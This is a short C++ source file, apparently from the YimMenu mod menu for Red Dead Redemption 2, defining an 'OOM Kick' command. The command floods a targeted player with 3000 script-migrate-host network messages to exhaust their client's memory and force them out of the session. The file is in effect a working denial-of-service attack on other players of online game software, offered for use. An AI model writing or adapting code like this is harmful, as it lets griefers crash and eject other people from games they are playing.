#include "game/commands/PlayerCommand.hpp"
#include "game/features/Features.hpp"
#include "game/rdr/Enums.hpp"
#include "util/Packet.hpp"

namespace YimMenu::Features
{
	class OOMKick : public PlayerCommand
	{
		using PlayerCommand::PlayerCommand;

		virtual void OnCall(Player player) override
		{
			Packet msg{};

			msg.write_message(NetMessage::MsgScriptMigrateHost);
			auto msg_id = player.GetHandle()->m_MessageId;

			for (int i = 0; i < 3000; i++)
			{
				msg.Send(msg_id);
			}
		}
	};

	static OOMKick _OOMKick{"oomkick", "OOM Kick", "Kicks the player out of your game"};
}